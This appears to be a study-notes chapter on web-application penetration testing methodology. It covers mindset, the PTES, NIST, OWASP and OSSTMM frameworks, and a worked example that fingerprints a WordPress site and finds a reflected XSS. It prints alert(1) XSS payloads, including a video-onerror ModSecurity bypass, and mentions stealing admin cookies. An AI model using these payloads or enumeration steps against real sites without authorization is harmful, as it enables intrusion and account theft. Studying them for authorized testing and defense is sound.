# Mindset and Methodologies

{% hint style="info" %}
### For This Chapter, am not going to focus on it this much. Practical is more important for me (Which is covered later). This chapter covers the theoretical and legal thoughts generally
{% endhint %}

## Mindset and Methodologies

> ### “Novices often view exploitation as some sort of magic process, but no magic is involved – only creativity, cleverness, and a lot of dedication. In other words, it is an art.”&#x20;
>
> * Enrico Perla and Massimo Oldani

Welcome to the first chapter, where we will begin our journey by understanding the right approach, mindset, and methodologies for attacking and exploiting modern web applications.

As we read in the epigraph, taken from the book _A Guide to Kernel Exploitation_, written by a dear friend, exploitation is considered an art, which makes it difficult to systematize. While our discussion focuses on web applications rather than the Linux kernel, it is essential to clarify what we mean by attacking web applications and exploiting their vulnerabilities.

In the first part of this chapter, we will clarify these concepts and learn about the approach, the steps of an attack, the testing techniques, the mindset, and the competencies we need to have. In the second part, we will learn about the existing methodologies and how to combine them to use them effectively in real-world scenarios.

In this chapter, we’re going to cover the following main topics:

* Approach and mindset
* Methodologies and frameworks for attacking web applications

## Approach and Mindset

We can define web attacks as activities that “target vulnerabilities in websites to gain unauthorized access, obtain confidential information, introduce malicious content, or alter the website’s content.” This includes the preparatory steps necessary for successful attacks in the context of web applications, such as information gathering, context-related risk analysis (threat modeling), and vulnerability discovery and analysis.

We will usually encounter these activities whether we are penetration testers, code reviewers, security researchers, or bug hunters. Even if we are red teamers and work primarily on networks and operating systems, we can find web applications during Initial Access, as well as when playing Capture the Flag (CTF) exercises, trying to solve web challenges.

Understanding these types of attacks can prove beneficial for various roles:

* **Developers**: Gaining an “attacker’s” perspective can assist in writing more secure code. This efficient approach is commonly incorporated into the security awareness courses we teach.
* **Forensic Analysts and Incident Responders**: They might need to analyze incidents involving applications or web servers. Knowledge about these attacks can provide a comprehensive understanding of what happened.
* **Security Managers and Chief Information Security Officers**: They may need to assess and manage risks related to web applications. This understanding can be instrumental in forming strategic security measures.

## What is Exploitation?

It all begins with a bug – an issue in the code, design, or configuration that generates a malfunction, incorrect results, a crash, or an abnormal termination. We are particularly interested in bugs that have security implications (security bugs), which can potentially be used to compromise an application or one of its components. Not all security bugs are exploitable; when they are, they are called vulnerabilities.

An exploit is a code or a procedure that allows you to take advantage of one or more vulnerabilities, and exploitation is the term used to describe this process.

## The Approach

Discovering and exploiting vulnerabilities can be likened to a problem-solving exercise. Consider this example: we were hired to conduct a Web Application Penetration Test (WAPT) on one web application accessible online: [https://onofri.org/security/](https://onofri.org/security/). We started from scratch – no credentials or inside information about the target. Thus, we interacted with a user-friendly web application that reciprocated our requests with HTML code, JavaScript, CSS, and images. What’s our next move?

If this was our first time engaging in such an activity or our first encounter with this target type, we could have considered two distinct approaches. The first, a more academic approach, involves studying all relevant theoretical concepts before proceeding to the practical stage. The second, a decided tinkerer approach, encourages hands-on experience.

However, there is a third way to balance these two extremes. As the Latins once stated, “In medio stat virtus” (“virtue stands in the middle”):

* Acquire a foundational understanding of theoretical concepts. This doesn’t involve becoming an expert but providing context and aiding navigation in specific situations. This foundational understanding can be bifurcated into two parts – understanding the technology itself and knowing about potential vulnerabilities and attacks that might be employed.
* Dive into hands-on practice. This involves exploring our needs through trial and error, observing an application’s responses to our requests, and modifying the application to understand its workings better. In this process, we loop back to theoretical concepts as and when required. This iterative approach allows for both practical and theoretical growth.

## The Approach in the Book

This book embodies this approach through its structure – the initial part serves as a primer, while the following two provide practical, scenario-based examples. Moreover, every scenario-centric chapter commences with a theoretical discussion before transitioning into the practical aspect.

## The Process

When we launch a web attack, we rely on a process that involves preparatory steps such as information gathering, threat modeling, vulnerability discovery, and vulnerability analysis. Then, we have the actual attack, which – if successful – leads to exploitation. These steps are based on the technical sections of the Penetration Testing Executing Standard (PTES).

## **Information Gathering**

If we start without having any information about the target, the first thing we do is understand the technology that underpins the application. There are several methods. Examining the HTML code returned from [https://onofri.org/security](https://onofri.org/security) is the most straightforward and least invasive. We can do this from any web browser, such as Firefox, by pressing Ctrl + U on Windows and Linux or Cmd + U on macOS.

We will find two particularly interesting lines from the HTML code associated with the meta tag named generator. As name suggests, this tag typically contains information about the software used to generate the page:

```html
htmlCopy code<meta name="generator" content="WordPress 6.2.2"/>
```

We can now infer that WordPress version 6.2.2 powers the website. Our next step is to visit the WordPress site for further investigation. First, we will check whether the installed version is the latest and whether any known vulnerabilities are associated.

To become more familiar with WordPress, as open-source software with publicly available code, we will download it and examine its file structure and contents. We can read the PHP (a recursive acronym for PHP: Hypertext Preprocessor) code and understand the structure – some foundational files – named WordPress Core – and a wide range of plugins and themes.

The source code gives us a significant advantage because it allows us to find vulnerabilities through static analysis by reviewing the code instead of relying solely on dynamic methods, such as sending queries. It also allows us to recreate the target application in our lab environment for analysis. This controlled environment allows us to modify the application, enhancing our understanding in a more “hybrid” fashion.

As Core allows additional plugins and themes, our next step should be identifying which ones are installed. Let’s understand the installed theme.

The file structure shows the themes inside the wp-content/themes directory. We then examine the HTML code again for this information. We can find it easily:

```html
htmlCopy code<script src='https://onofri.org/security/wp-content/themes/astra/assets/js/minified/frontend.min.js?ver=4.1.5' id='astra-theme-js-js'></script>
```

We’ve determined that the active theme is astra. We know the theme but not the version. However, we can download it to determine when to read the version. From the theme directory, we find the following file list: 404.php, admin, archive.php, assets, changelog.txt, comments.php, footer.php, functions.php, header.php, inc, index.php, languages, page.php, readme.txt, screenshot.jpg, search.php, searchform.php, sidebar.php, single.php, style.css, template-parts, theme.json, toolset-config.json, wpml-config.xml

Take readme.txt, for example, which contains extensive metadata. Unfortunately, we get blocked when we try to access it via https://onofri.org/security/wp-content/themes/astra/readme.txt.

Undaunted, we look for an alternative and find that changelog.txt contains the version information and is accessible via https://onofri.org/security/wp-content/themes/astra/changelog.txt. We can get the installed version from here by looking for the latest entry:

```vbnet
vbnetCopy codev4.1.5
- Fix: Offcanvas Menu - Transparent empty canvas visible on expanding offcanvas toggle button.
- Fix: Custom Layouts - Block editor core blocks custom spacing incorrectly applies to custom layout blocks in editor.
```

In addition, our familiarity with WordPress allows us to identify the login page address ([https://onofri.org/security/wp-login.php](https://onofri.org/security/wp-login.php)) and potentially perform actions such as user enumeration or password discovery.

This is an example of our strategy when targeting a web application. Given the target scope of [https://onofri.org/security](https://onofri.org/security), we can discover numerous other elements. Now that we know the version of WordPress, the theme, and its version, we can proceed by enumerating the installed plugins. This can be done passively by examining the generated code or more actively (and somewhat aggressively) by creating a list of all available plugins (or the most commonly installed ones) and checking for the presence of files in the target path. In the same way, we can consider a wordlist of common files such as phpinfo.php, info.php, or test.php.

## **Threat Modeling**

Once we understand our target, we will prepare our potential avenues of attack. To determine the most effective types of attacks, we need to understand the context and related risks. This practice is called threat modeling. We can be specific about the capabilities and the technology used and match them to our goals, such as the following:

* If a SQL database is used, we might try SQL injection to gain database access.
* If there is a file upload function, we might test for unrestricted file upload vulnerabilities to gain remote code execution.
* If user input is not properly sanitized, we might test for Cross-Site Scripting (XSS) to execute arbitrary scripts in the context of the user's browser.

This list of potential vulnerabilities and attack vectors provides a targeted approach, saving time and resources. It’s always better to prioritize potential high-impact attacks over less significant ones.

## **Vulnerability Discovery and Analysis**

After identifying the potential vulnerabilities, we need to verify their presence. This step involves creating proof of concept (PoC) exploits to test the vulnerabilities. Once we find a vulnerability, we need to analyze it to determine its impact. This includes understanding how to exploit it, the possible damage, and potential mitigations.

#### Vulnerability Analysis Summary (Technical Parts)

1. **Initial Checks**:
   * Verified if WordPress, plugins, and themes are up-to-date or have known vulnerabilities.
2. **Discovery**:
   * Found an exposed test page (`test.php`) via URL: `https://onofri.org/security/test.php`.
   * Detected reflected input by submitting text `hello there`.
3. **Source Code Review**:
   *   Observed reflection in HTML:

       ```html
       <p id=echoed>
       hello there
       </p>
       ```
4. **Testing for XSS**:
   *   Inserted HTML tag:

       ```html
       <b>hello there</b>
       ```

       URL: `https://onofri.org/security/test.php?param=<b>hello+there</b>`
   *   Observed reflected HTML in source code:

       ```html
       <p id=echoed>
       <b>hello there</b>
       </p>
       ```
5. **JavaScript Injection**:
   *   Attempted to inject JavaScript:

       ```html
       <script>alert(1)</script>
       ```

       URL: `https://onofri.org/security/test.php?param=<script>alert(1)</script>`
   *   Encountered WAF response (Mod\_Security):

       ```html
       <head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>
       ```
6. **Bypass Attempts**:
   *   Tried `<img>` tag with `onerror` attribute:

       ```html
       <img src=x onerror=alert(1)>
       ```

       URL: `https://onofri.org/security/test.php?param=<img%20src=x%20onerror=alert(1)>`
   * Encountered same WAF response.
7. **Successful Exploitation**:
   *   Bypassed WAF using `<video>` tag:

       ```html
       <video src=x onerror=alert(1)>
       ```

       URL: `https://onofri.org/security/test.php?param=<video%20src=x%20onerror=alert(1)>`
   *   Confirmed XSS vulnerability when alert was triggered:

       ```html
       <p id=echoed>
       <video src=x onerror=alert(1)>
       </p>
       ```

## Attacking and Exploiting

Finally, after discovering and analyzing a vulnerability, we move on to the actual attack, leveraging our PoC to gain unauthorized access or perform other malicious activities. If successful, this stage results in the exploitation of the target application.

#### Exploitation Summary (Technical Parts)

1. **Approach**:
   * Consider using known bypasses from online sources or study Mod\_Security rules, typically OWASP core ruleset.
2. **Configuration File Analysis**:
   *   Discovered `img` tag is filtered:

       ```html
       [...] h1|head|hr|html|i|iframe|ilayer|img|input|ins|isindex|kdb [...]
       ```
   * Noted `video` tag, an HTML5 element, is not filtered.
3. **Bypass Attempt with `video` Tag**:
   *   Constructed XSS vector:

       ```html
       <video src=x onerror=alert(1)>
       ```

       URL: `https://onofri.org/security/test.php?param=<video%20src=x%20onerror=alert(1)>`
4. **Exploitation Confirmation**:
   *   Observed successful alert message indicating XSS:

       ```html
       <p id=echoed>
       <video src=x onerror=alert(1)>
       </p>
       ```
5. **Further Actions**:
   * Exploited XSS by executing arbitrary JavaScript code.
   * Potential to weaponize XSS to steal WordPress admin cookies for further penetration testing.

## Methodologies and Frameworks Summary

**Security Methodologies Overview:**

* Security methodologies define what, who, when, and where testing is conducted, involving detailed processes and steps.
* Effective security testing combines various methodologies for comprehensive coverage.

**Key Methodologies:**

1.  **NIST SP 800-115:**

    * _Technical Guide to Information Security Testing and Assessment._
    * Process: Discovery (Information Gathering, Vulnerability Analysis), Attack (Gaining Access), and Reporting.
    * Emphasizes black box testing for critical components and includes white and gray box techniques.



    <figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>The SP 800-115 process</p></figcaption></figure>


2.  **Penetration Testing Execution Standard (PTES):**

    * Developed by security practitioners in 2014.
    * Phases: Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, and Post-Exploitation.
    * Highlights active and passive vulnerability identification and private research for vulnerability discovery.



    <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>PTES technical process</strong></p></figcaption></figure>


3.  **OWASP's Web Security Testing Guide (WSTG):**

    * Independent organization promoting application security.
    * Structured into parts covering introduction, testing life cycle, test categories, and reporting.
    * Focuses on application-level security, with steps including Information Gathering, Authentication, Input Validation, and Business Logic.



    <figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>OWASP WSTG sections</strong></p></figcaption></figure>


4.  **ISECOM's Open Source Security Testing Methodology Manual (OSSTMM):**

    * Comprehensive security testing methodology starting in 2000.
    * Covers various test channels (human, physical, wireless, telecommunications, data networks) and emphasizes a broad approach to security testing.
    * A must-read for understanding and mapping testing workflows.



    <figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>The OSSTMM process</strong></p></figcaption></figure>

## **Combining Methodologies:**

**The Recipe:**

* **Information Gathering:** Uses PTES, SP 800-115, and WSTG.
* **Threat Modeling:** Uses PTES and WSTG.
* **Vulnerability Analysis:** Uses PTES, SP 800-115, and WSTG.
* **Exploitation:** Uses PTES and SP 800-115.
* **Post-Exploitation:** Uses PTES and SP 800-115, aligned with MITRE ATT\&CK framework.

**Additional Frameworks and Standards:**

* **Application Security Verification Standard (ASVS):** Over 250 application security requirements.
* **PCI-DSS:** Compliance for payment systems.
* **NESCOR Guide:** For Industrial Control Systems.
* **MITRE ATT\&CK:** For wide-ranging attack analysis and tactics.

**Conclusion:**

* Combining methodologies like NIST SP 800-115, PTES, WSTG, and OSSTMM provides a robust framework for effective security testing.
* The approach involves a detailed process starting with information gathering, threat modeling, vulnerability analysis, exploitation, and post-exploitation.
* A proper mindset, curiosity, and technical skills are crucial for effective security testing.

## Conclusion

We’ve laid the groundwork by understanding the approach and mindset required to attack and exploit modern web applications. We’ve discussed the process of gathering information, threat modeling, discovering vulnerabilities, and the actual attack. The knowledge and skills acquired through this iterative approach will be our foundation as we delve deeper into specific vulnerabilities and real-world scenarios in subsequent chapters.
